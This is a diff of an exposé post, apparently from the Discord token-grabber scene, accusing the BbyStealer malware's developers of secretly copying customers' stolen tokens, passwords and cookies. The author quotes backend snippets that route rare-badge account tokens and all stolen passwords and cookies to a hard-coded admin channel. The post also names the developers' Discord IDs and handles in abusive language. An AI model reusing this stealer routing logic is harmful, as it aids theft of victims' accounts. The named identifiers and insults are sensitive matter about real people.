@@ -2,13 +2,13 @@
 
 Alright skidz. I come with wonderful information for all you "wonderful" people.
 
-Your beloved Bby Stealer has been lying to you all this time.
+Your beloved BbyStealer has been lying to you all this time.
 Your beloved developers claim they "do not grab" or dualhook.
 
 **They lied.**  
 
 We recently obtained a copy of their shitty website backend. Obviously, this was possible because the developers are shit at what they do.  
-(You should really stop grabbing, and stop paying for this shit malware.)  
+(You should really stop grabbing, and stop paying for this shit malware)  
 
 # Prelude:
 **c0lzia**: Yo, let's make a stealer. **copies PirateStealer's code**  
@@ -20,7 +20,7 @@ We recently obtained a copy of their shitty website backend. Obviously, this was
 **brunxkd**: Maybe we should steal some earlies together.  
 **c0lzia**: Fuck it, I want some earlies too! **inserts dual hook**  
 **c0lzia**: Ah, yes. Now these fools will pay me for my shit PirateStealer clone, and I can steal some earlies when I feel like it!  
-**brunxkd**: Haha fucking idiots. They'll do our job for us and make us money.  
+**brunxkd**: Haha fucking idiots. They'll do our job for us, and make us money by paying for this piece of shit.  
 **brunxkd**: If they come saying the tokens don't work, we can just say they were too slow and the person reset.  
 **c0lzia**: It's the ultimate master plan. We're absolute geniuses!  
 
@@ -29,7 +29,7 @@ We recently obtained a copy of their shitty website backend. Obviously, this was
 **ShitSkid**: DEVS U STEALING MY EARLIES WTF?  
 ...  
 **c0lzia**: Are you an idiot? I don't get your shit. I don't grab.  
-**Everyone**: Why are these tokens not working????? I just grabbed them????  
+**Everyone**: Why are these tokens not working????? I just grabbed a bot developer?????  
 **brunxkd**: idk you're just slow and the victim reset their account. /shrug  
 
 # The motherfucking evidence:
@@ -50,9 +50,12 @@ Okay, does that make sense to your simple brain? Good! I'm glad we're on the sam
 
 Cool!
 
-... not cool.
+... not cool. (obviously, fucking stupid)  
 
-Bby's server code has **a few key points of interest**. 
+I know I'm not going stop you from using a shitty grabber by simply saying so, so here.  
+This info might just make you reconsider how much trust and money you put into BbyStealer.
+
+Bby's backend code has **a few key points of interest**. 
 
 # Exhibit #1:
 - ```const admins = ["454317547622367232", "917648088582197298"]```;  
@@ -60,7 +63,8 @@ The user IDs of the admins.
 454317547622367232 = brunxkd#3333  
 917648088582197298 = c0lzia#9999  
 
-These IDs are checked for in the sendEmbed() method to find the admin channels. Big surprise!  
+These IDs are checked for in the `sendEmbed()` method to find the admin channels. Big surprise!  
+"Wait, what does that mean?" -- Observe the next two exhibits!
 
 # Exhibit #2:
 When your victim opens the malware, it calls an API `/yourname/tokens`  
@@ -68,24 +72,28 @@ When your victim opens the malware, it calls an API `/yourname/tokens`
 - ```getTokenInfo(tokens, channelId, ip = undefined, dualHook = false)```
 
 "Wait, I thought you said it was dual hooked"  
-Well, the shit (Early supporter, etc) tokens aren't. But ALL the passwords.txt and cookies.txt are!  
-However, if you observe the above code, all they need to change is the "false" to "true", and that's it.  
+Well, the shit tokens (Early supporter, etc) aren't. But ALL the passwords.txt and cookies.txt are!  
+However, if you observe the above code, all they need to change is the "false" to "true", and that's it.
+That. is. it! False to True and all your grabbed accouts are belong to us.  
 
 Just look at **Exhibit #3**, this is the juicy shit.  
 
 # Exhibit #3:
-HA SIKE
+Oh my, if "discord_partner", "hypesquad"... What next?  
+Observe this code.  
 ```
 if (badges.includes("discord_partner") || badges.includes("HypeSquad_Event") || badges.includes("Bug_Hunter") || badges.includes("Discord_certified_moderator") || badges.includes("Verified_Bot_Developer")) {
     sendEmbed([embed, (await getHQFriendList(token))], "907326009479667735", true); // Sends the token to admins. Look at the "true" at the end.
     return; // Exit the code execution
 }
+sendEmbed([embed, (await getHQFriendList(text.token))], channelId, true);
 ```
-Just as a refresher, check the method for sendEmbed()
+This code looks for all the ULTRA rare accounts. And then sends it to a hard coded channel ID `907326009479667735` and `true` = admin.
+Just as a refresher, check the method for sendEmbed()  
 ```
-async function sendEmbed(embeds = [], channelId = 0, admin = false)
+async function sendEmbed(embeds = [], >> channelId = 0, admin = false <<) // These >> two parameters << are important, duhhh!
 ```
-If the last parameter is true, it sends it to the admins.  
+If the 2nd parameter is set, it'll hard code a channel to send to. If the last parameter is true, it sends it to the admins.  
 
 If you grab any of the following accounts:  
 * Discord Partner
@@ -94,11 +102,12 @@ If you grab any of the following accounts:
 * Discord Certified Moderator
 * Verified Bot Developer
 
-**The admins get these tokens too. DUALHOOKED motherfucker!**
-The developers have been stealing your precious ultra rare accounts!
+**The admins get these tokens. DUALHOOKED motherfucker!**. You don't!  
+The developers have been stealing your precious ultra rare accounts!  
+Aww how sad this is.  
 
 # Exhibit #4:
-All the passwords and cookies are dualhooked... All. of. them.
+All the passwords and cookies are dualhooked... **All. of. them.**
 ```
 // Send to the skidz
 client.channels.cache.get(clients[req.params.name])
@@ -123,17 +132,18 @@ if (clients[req.params.name] != "907326009479667735")
 ... There is so much more. If you're a skid and you want to know more, just contact me. My Discord is at the bottom of this post.  
 
 # Finally...
-Fuck you Bbystealer, and fuck you brunxskid c0lskidzia. Fuck you.  
-Do not buy Bbystealer. Do not trust these fuckers.  
-Be aware of new grabbers from this date, they can "rebrand" and make a new stealer, but be the same little shits.  
-In fact, just stop stealing people's shit, you stupid fuckers. You stupid fucking script kiddies.  
+Do not trust these fuckers. Don't trust ANY malware developer.  
+Watch out, when this post goes live they'll probably want to rebrand.  
+You know, to avoid disappointment, you could literally stop being a stupid fuckng script kiddie and, idk, get a life?  
+In fact, just stop stealing people's shit, you stupid fuckers. Supid fucking script kiddies.  
 
 # To the shitty malware developers
 Ayooo developers~, if you wanna cry (or shit your pants), come cry (or shit your pants) in my DMs: Extra Frisky#1788  
+Fuck you Bbystealer, and fuck you brunx**skid** c0l**skid**zia. Fuck you.  
 I want you to spam me, or mass DM group me, fucking do it. I don't give a shit. I just want your tearsssssss. 😂👌  
 
 # A final ~~sad~~ goodbye.
-Byebye, Bbystealer. Oh, Bbystealer.  
+Byebye, Bby. Oh, Bbystealer.  
 Let's just reminisce on the good times, oh how much fun we had. It was so fun!  
 We cracked all your shitty stealer variants. We pwned your webserver.  
 Kinda sad it has to come to and end, it was truly fun fucking with your shit. I loved the challenges.  
@@ -148,9 +158,9 @@ P.S: Fuck you.
 
 # TL;DR
 1) Bbystealer steals your passwords.txt and cookies.txt
-2) Bbystealer steals your ultra-rare badges. Partner, Developer, HypeSquad, etc.
+2) Bbystealer steals your ultra-rare badges. Partner, Developer, HypeSquad, etc. (you get none of these)
 3) You only get shitty badges like Early Supporter. 
-4) Bby is DUALHOOKED. Evidence above. 
+4) Bby is DUALHOOKED in every way possible. Evidence above in code snippets. 
 Want more proof? Message me `Extra Frisky#1788`
 
 
